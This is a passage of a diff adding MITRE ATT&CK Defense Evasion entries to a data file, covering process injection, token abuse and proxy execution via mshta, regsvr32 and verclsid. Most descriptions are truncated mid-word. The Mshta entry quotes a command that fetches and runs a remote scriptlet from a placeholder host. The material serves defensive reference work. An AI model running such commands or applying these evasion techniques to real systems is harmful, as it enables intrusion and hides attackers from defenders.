+DESCRIPTION: Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data. Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Pre-OS Boot
+TECHNIQUE ID: T1542
+TACTIC: Defense Evasion, Persistence
+PLATFORMS: Linux, Network Devices, Windows, macOS
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control. Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Build Image on Host
+TECHNIQUE ID: T1612
+TACTIC: Defense Evasion
+PLATFORMS: Containers
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it. An adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image. If the base image is pulled from a public registry, defenses will 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Portable Executable Injection
+TECHNIQUE ID: T1055.002
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additi
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Verclsid
+TECHNIQUE ID: T1218.012
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell. Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attac
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Downgrade Attack
+TECHNIQUE ID: T1562.010
+TACTIC: Defense Evasion
+PLATFORMS: Windows, Linux, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation. Adversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040). For example, [PowerShell](https://attack.mitre.org/techniq
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Virtualization/Sandbox Evasion
+TECHNIQUE ID: T1497
+TACTIC: Defense Evasion, Discovery
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. Adversaries may use several methods
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Mshta
+TECHNIQUE ID: T1218.005
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code> They may also be executed directly from URLs: <code>mshta
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Execution Guardrails
+TECHNIQUE ID: T1480
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses. Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Token Impersonation/Theft
+TECHNIQUE ID: T1134.001
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread. An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Port Knocking
+TECHNIQUE ID: T1205.001
+TACTIC: Defense Evasion, Persistence, Command And Control
+PLATFORMS: Linux, macOS, Windows, Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system. The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the li
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: LNK Icon Smuggling
+TECHNIQUE ID: T1027.012
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Hidden Users
+TECHNIQUE ID: T1564.002
+TACTIC: Defense Evasion
+PLATFORMS: macOS, Windows, Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Every user has
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Make and Impersonate Token
+TECHNIQUE ID: T1134.003
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread. This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Impair Command History Logging
+TECHNIQUE ID: T1562.003
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, macOS, Network Devices, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTRO
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: User Activity Based Checks
+TECHNIQUE ID: T1497.002
+TACTIC: Defense Evasion, Discovery
+PLATFORMS: Linux, Windows, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. Adversaries may sear
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Parent PID Spoofing
+TECHNIQUE ID: T1134.004
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context. Adversaries ma
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: VDSO Hijacking
+TECHNIQUE ID: T1055.014
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This cod
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Selective Exclusion
+TECHNIQUE ID: T1679
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may intentionally exclude certain files, folders, directories, file types, or system components from encryption or tampering during a ransomware or malicious payload execution. Some file extensions that adversaries may avoid encrypting include `.dll`, `.exe`, and `.lnk`. Adversaries may perform this behavior to avoid alerting users, to evade detection by security tools and analysts, or, in the case of ransomware, to ensure that the system remains operational enough to deliver the ransom notice. Exclusions may target files and components whose corruption would cause instability, break core services, or immediately expose the attack. By carefully avoiding these areas, adversaries m
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Disable or Modify Network Device Firewall
+TECHNIQUE ID: T1562.013
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may disable network device-based firewall mechanisms entirely or add, delete, or modify particular rules in order to bypass controls limiting network usage. Modifying or disabling a network firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add new network firewall rules to allow access to all internal network subnets without restrictions. Adversaries may gain access to the firewall management console via [Valid Accounts](https://attack.mitre.org/techniques/T1078) or by exploiting a vulnerability. In some cases, threat actors may target firewalls that have been exposed to th
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Delay Execution
+TECHNIQUE ID: T1678
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may employ various time-based methods to evade detection and analysis. These techniques often exploit system clocks, delays, or timing mechanisms to obscure malicious activity, blend in with benign activity, and avoid scrutiny. Adversaries can perform this behavior within virtualization/sandbox environments or natively on host systems. Adversaries may utilize programmatic `sleep` commands or native system scheduling functionality, for example [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053). Benign commands or other operations may also be used to delay malware execution or ensure prior commands have had time to execute properly. Loops or otherwise needless repetiti
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: ROMMONkit
+TECHNIQUE ID: T1542.004
+TACTIC: Defense Evasion, Persistence
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persi
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Compiled HTML File
+TECHNIQUE ID: T1218.001
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe). A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Network Share Connection Removal
+TECHNIQUE ID: T1070.005
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Disable or Modify Tools
+TECHNIQUE ID: T1562.001
+TACTIC: Defense Evasion
+PLATFORMS: Containers, IaaS, Linux, macOS, Network Devices, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems. Adversaries may trigger a denial-of-service attack via legitimate system processes. It has been previously observed that the Windows Time Travel Debugging (TTD) monitor driver can be used to initiate 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Modify System Image
+TECHNIQUE ID: T1601
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves. On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file. To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it. This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Browser Fingerprint
+TECHNIQUE ID: T1036.012
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may attempt to blend in with legitimate traffic by spoofing browser and system attributes like operating system, system language, platform, user-agent string, resolution, time zone, etc. The HTTP User-Agent request header is a string that lets servers and network peers identify the application, operating system, vendor, and/or version of the requesting user agent. Adversaries may gather this information through [System Information Discovery](https://attack.mitre.org/techniques/T1082) or by users navigating to adversary-controlled websites, and then use that information to craft their web traffic to evade defenses.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Indicator Removal from Tools
+TECHNIQUE ID: T1027.005
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems. A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Valid Accounts
+TECHNIQUE ID: T1078
+TACTIC: Defense Evasion, Persistence, Privilege Escalation, Initial Access
+PLATFORMS: Containers, ESXi, IaaS, Identity Provider, Linux, macOS, Network Devices, Office Suite, SaaS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provi
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Process Hollowing
+TECHNIQUE ID: T1055.012
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process. Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code> before b
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Resource Forking
+TECHNIQUE ID: T1564.009
+TACTIC: Defense Evasion
+PLATFORMS: macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code. Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder. Adversaries can use res
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Obfuscated Files or Information
+TECHNIQUE ID: T1027
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, macOS, Network Devices, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Invalid Code Signature
+TECHNIQUE ID: T1036.001
+TACTIC: Defense Evasion
+PLATFORMS: Windows, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files. Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signatur
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Run Virtual Instance
+TECHNIQUE ID: T1564.006
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows, ESXi
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values. Adversaries may utilize native
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Polymorphic Code
+TECHNIQUE ID: T1027.014
+TACTIC: Defense Evasion
+PLATFORMS: Windows, macOS, Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution. With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools. Other obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as [Software Packing](https://attack.mi
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: SID-History Injection
+TECHNIQUE ID: T1134.005
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens). With Domain Administrator (or equivalent) rights, harvested or well-known SID values may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Network Boundary Bridging
+TECHNIQUE ID: T1599
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks. Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks. They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections. Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications. To par
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Subvert Trust Controls
+TECHNIQUE ID: T1553
+TACTIC: Defense Evasion
+PLATFORMS: Windows, macOS, Linux
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site. Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the spe
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Regsvr32
+TECHNIQUE ID: T1218.010
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissio
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Rename Legitimate Utilities
+TECHNIQUE ID: T1036.003
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython. It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Spoof Security Alerting
+TECHNIQUE ID: T1562.011
+TACTIC: Defense Evasion
+PLATFORMS: Windows, macOS, Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident. Rather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Steganography
+TECHNIQUE ID: T1027.003
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files. [Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. By the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular ca
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Web Session Cookie
+TECHNIQUE ID: T1550.004
+TACTIC: Defense Evasion, Lateral Movement
+PLATFORMS: SaaS, IaaS, Office Suite
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated. Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Domain Accounts
+TECHNIQUE ID: T1078.002
+TACTIC: Defense Evasion, Persistence, Privilege Escalation, Initial Access
+PLATFORMS: ESXi, Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services. Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Regsvcs/Regasm
+TECHNIQUE ID: T1218.009
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Install Root Certificate
+TECHNIQUE ID: T1553.004
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
